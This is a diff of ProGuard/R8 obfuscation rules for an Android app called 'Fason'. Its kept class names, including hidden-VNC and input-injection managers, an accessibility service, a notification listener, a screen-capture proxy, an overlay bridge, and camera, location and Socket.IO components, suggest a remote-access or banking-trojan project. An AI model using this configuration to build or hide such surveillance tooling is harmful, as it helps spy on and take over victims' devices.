@@ -1,54 +1,83 @@
--keep class io.socket.client.** { *; }
--keep class io.socket.engineio.client.** { *; }
--keepclassmembers class io.socket.client.Socket {
-    *** on(...);
-    *** off(...);
-    *** emit(...);
-    *** connect(...);
-    *** disconnect(...);
+# ─── Fason ProGuard rules ────────────────────────────────────────────────────
+# Kept lean — R8 handles the heavy lifting. Only explicit -keep for things that
+# break under obfuscation: reflection targets, JS interfaces, socket callbacks.
+
+# ── Core app ──────────────────────────────────────────────────────────────────
+-keep class com.fason.app.core.** { *; }
+-keep class com.fason.app.service.** { *; }
+-keep class com.fason.app.receiver.** { *; }
+-keep class com.fason.app.ui.MainActivity { *; }
+-keep class com.fason.app.ui.ScreenCaptureProxyActivity { *; }
+
+# ── JavaScript bridge interfaces (addJavascriptInterface) ─────────────────────
+# Methods called from JS are invoked by reflection — obfuscation breaks them.
+-keepclassmembers class * {
+    @android.webkit.JavascriptInterface <methods>;
 }
+# Springe and any overlay bridge class
+-keep class com.fason.app.features.springe.SpringeManager$SpringeBridge { *; }
+
+# ── Socket.IO ─────────────────────────────────────────────────────────────────
+-keep class io.socket.** { *; }
+-keep interface io.socket.** { *; }
 -dontwarn io.socket.**
--keep class androidx.camera.core.ImageCapture { *; }
--keep class androidx.camera.core.CameraSelector { *; }
--keep class androidx.camera.core.Preview { *; }
--keep class androidx.camera.lifecycle.ProcessCameraProvider { *; }
--dontwarn androidx.camera.**
--keep class com.google.android.gms.location.** { *; }
--keep class com.google.android.gms.internal.** { *; }
--dontwarn com.google.android.gms.internal.**
--keepclassmembers class com.fason.app.** {
-    *** get(...);
-    *** set(...);
+
+# ── Accessibility services ────────────────────────────────────────────────────
+-keep class * extends android.accessibilityservice.AccessibilityService { *; }
+
+# ── Notification listener ─────────────────────────────────────────────────────
+-keep class * extends android.service.notification.NotificationListenerService { *; }
+
+# ── WorkManager ───────────────────────────────────────────────────────────────
+-keep class * extends androidx.work.Worker { *; }
+-keep class * extends androidx.work.ListenableWorker {
+    public <init>(android.content.Context, androidx.work.WorkerParameters);
 }
-# Unified AccessibilityService must not be renamed (system references it by class name)
--keep class com.fason.app.core.FasonAccessibilityService { *; }
--keep class com.fason.app.features.hvnc.HVncManager { *; }
--keep class com.fason.app.features.hvnc.InputInjector { *; }
--dontwarn okhttp3.**
--dontwarn okio.**
--keep class okhttp3.OkHttpClient { *; }
--keep class okhttp3.Request { *; }
--keep class okhttp3.Response { *; }
--keep interface okhttp3.** { *; }
--keep class androidx.work.** { *; }
-# OkHttp (used by socket.io)
--dontwarn okhttp3.internal.platform.**
--dontwarn org.conscrypt.**
--dontwarn org.bouncycastle.**
--dontwarn org.openjsse.**
-# CameraX
+
+# ── CameraX ───────────────────────────────────────────────────────────────────
 -keep class androidx.camera.** { *; }
 -dontwarn androidx.camera.**
-# Google Play Services
--keep class com.google.android.gms.** { *; }
+
+# ── OkHttp / Okio (Socket.IO dep) ─────────────────────────────────────────────
+-dontwarn okhttp3.**
+-dontwarn okio.**
+
+# ── Google Play Services Location ─────────────────────────────────────────────
+-keep class com.google.android.gms.location.** { *; }
 -dontwarn com.google.android.gms.**
--optimizationpasses 5
--dontusemixedcaseclassnames
--dontskipnonpubliclibraryclasses
--verbose
--keepattributes SourceFile,LineNumberTable
--assumenosideeffects class android.util.Log {
-    public static *** d(...);
-    public static *** v(...);
-    public static *** i(...);
+
+# ── Keep all BroadcastReceivers registered in manifest ────────────────────────
+-keep class * extends android.content.BroadcastReceiver { *; }
+
+# ── Enums (used in switch statements via ordinal/name) ────────────────────────
+-keepclassmembers enum * {
+    public static **[] values();
+    public static ** valueOf(java.lang.String);
 }
+
+# ── Serializable / Parcelable ─────────────────────────────────────────────────
+-keepclassmembers class * implements java.io.Serializable {
+    static final long serialVersionUID;
+    private void writeObject(java.io.ObjectOutputStream);
+    private void readObject(java.io.ObjectInputStream);
+    java.lang.Object writeReplace();
+    java.lang.Object readResolve();
+}
+
+# ── Native methods ────────────────────────────────────────────────────────────
+-keepclasseswithmembernames class * {
+    native <methods>;
+}
+
+# ── Suppress harmless missing-class warnings from GMS / AndroidX ──────────────
+-dontwarn com.google.errorprone.**
+-dontwarn org.bouncycastle.**
+-dontwarn org.conscrypt.**
+-dontwarn org.openjsse.**
+-dontwarn javax.annotation.**
+-dontwarn sun.security.**
+
+# ── R8 full-mode: allow aggressive class merging and inlining ─────────────────
+-allowaccessmodification
+-mergeinterfacesaggressively
+-overloadaggressively
